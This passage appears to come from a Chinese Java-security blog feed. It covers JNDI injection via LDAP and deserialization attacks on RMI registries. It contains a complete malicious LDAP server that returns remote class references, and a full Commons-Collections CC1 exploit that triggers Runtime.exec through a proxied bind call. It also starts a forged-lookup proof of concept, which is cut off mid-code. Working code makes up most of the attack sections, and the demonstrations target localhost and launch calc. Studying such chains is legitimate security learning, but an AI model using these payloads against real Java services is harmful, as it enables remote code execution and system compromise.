System.out.println(remoteObj.sayHello(<span class="string">&quot;n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713154736808.png" alt="image-20240713154736808"></p><p>可以跟一下调试</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713160109911.png" alt="image-20240713160109911"></p><p>到这里实例化了恶意对象</p><p>此方法加载了外部的java字节码, 在高版本中这是不受信任的</p><h3 id="JNDI结合LDAP"><a href="#JNDI结合LDAP" class="headerlink" title="JNDI结合LDAP"></a>JNDI结合LDAP</h3><blockquote><ul><li>ldap 是一种协议，并不是 Java 独有的。</li></ul><p>LDAP 既是一类服务，也是一种协议，定义在 <a href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251</a>(<a href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511</a>) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 <strong>X.500-lite</strong>。</p><p>LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p><p>LDAP 的请求和响应是 <strong>ASN.1</strong> 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind&#x2F;Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。</p></blockquote><p>首先是添加LDAP的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/#EvilObject&quot;</span>;  </span><br><span class="line"> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line"> config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,  </span><br><span class="line"> InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),  </span><br><span class="line"> port,  </span><br><span class="line"> ServerSocketFactory.getDefault(),  </span><br><span class="line"> SocketFactory.getDefault(),  </span><br><span class="line"> (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line"> config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line"> <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line"> System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line"> ds.startListening();  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;  </span></span><br><span class="line"><span class="comment"> * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span></span><br><span class="line"><span class="comment"> */</span> <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line"> <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line"> &#125;  </span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line"> System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line"> <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line"> <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line"> &#125;  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  </span><br><span class="line"> result.sendSearchEntry(e);  </span><br><span class="line"> result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILdapClient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"> <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;ldap://localhost:1099/remoteObj&quot;</span>);  </span><br><span class="line"> System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python 起一个 HTTP 服务存放恶意类即可</p><blockquote><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p><p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JNDI注入初探&quot;&gt;&lt;a href=&quot;#JNDI注入初探&quot; class=&quot;headerlink&quot; title=&quot;JNDI注入初探&quot;&gt;&lt;/a&gt;JNDI注入初探&lt;/h1&gt;&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>针对RMI的几种攻击方式</title>
    <link href="http://example.com/2024/07/10/%E9%92%88%E5%AF%B9RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://example.com/2024/07/10/%E9%92%88%E5%AF%B9RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2024-07-10T05:51:40.000Z</published>
    <updated>2024-07-12T07:00:30.425Z</updated>
    
    <content type="html"><![CDATA[<h2 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h2><p>客户端请求注册中心有 list, bind, rebind, unbind, lookup这几种方式, 当他们被调用时, 在Registry服务端中<code>RegistryImpl_Skel#dispatch</code>就会对应执行,且往往伴随着反序列化的进行,  这就导致了其易受攻击</p><p>如果你打开查看源码, 会发现dispatch方法下有几个case分支, 他们与调用方法的对应关系如下:</p><ul><li>0 —– bind</li><li>1 —– list</li><li>2 —– lookup</li><li>3 —– rebind</li><li>4 —– unbind</li></ul><p>我们按顺序依次分析:</p><h3 id="bind与rebind"><a href="#bind与rebind" class="headerlink" title="bind与rebind"></a>bind与rebind</h3><p>bind方法对应了你在客户端的这条代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><p>你是否疑惑, 绑定对象不是在服务器实现的吗, 怎么会造成客户端攻击服务器呢??</p><p>实际上在客户端拿到的注册中心的Stub (客户端拿到的是RegistryImpl_Stub) 中,是有上面提到的所有5种方法的, 因此在Client端也可以使用bind方法, 就是这么简单</p><p>直接看<code>RegistryImpl_Skel#dispatch</code>的源码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710140531336.png" alt="image-20240710140531336"></p><p>很容易就发现了反序列化的入口, 这里的var11就是传过来的序列化对象, 因此利用起来也是非常ez     (神马??你问我怎么知道var11是传过来的序列化对象???? 当然是因为它的类型是<code>ObjectInput var11;</code>加上<code>var11 = var2.getInputStream();</code>啦)</p><p>有了反序列化的入口, 配合我们之前学过的CC链, 就可以来一段组合技</p><p>先给注册中心导入CC1的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接拿来CC1的exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在CC1中它的起点是<code>AnnotationInvocationHandler.readObject()</code>, 它正好是一个<code>InvocationHandler</code></p><p>我们知道服务器接收到的对象是一个远程动态代理, 所以还需要稍作修改, </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(proxy);</span><br></pre></td></tr></table></figure><p>这样就得到了一个恶意的远程动态代理</p><p>完整的exp是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(proxy);</span><br><span class="line"></span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, remote);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用它来请求带有CC1依赖的服务器即可完成攻击</p><p>注:</p><p>rebind 的攻击也是如此，将 <code>registry.bind(&quot;test&quot;,remote);</code> 替换为 <code>rebind(&quot;test&quot;,remote);</code> 方法即可。</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><code>list()</code> 方法可以列出目标上所有绑定的对象</p><p>来看list对应的源码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710181633835.png" alt="image-20240710181633835"></p><p>因为这里没有 <code>readObject()</code>，所以无法进行反序列化</p><p>因此没有什么利用价值</p><h3 id="lookup与unbind"><a href="#lookup与unbind" class="headerlink" title="lookup与unbind"></a>lookup与unbind</h3><p>这里lookup是有反序列化入口的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710182215919.png" alt="image-20240710182215919"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IHello</span> <span class="variable">ihello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure><p>但在客户端这边我们只能传入字符串, 该怎么传入恶意类呢?</p><p>实际上我们可以通过反射直接修改lookup中用到的对象为恶意对象,并反射执行(简单说就是伪造一个lookup), 这样就可以绕过这一限制, 至于服务端的强制类型转换, 并不影响反序列化的执行</p><p>可以根据<code>RegistryImpl_Stub</code>这个类中的lookup方法来构造, 由于这个类是反编译过来的, 看起来还是比较麻烦, 先看最终的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 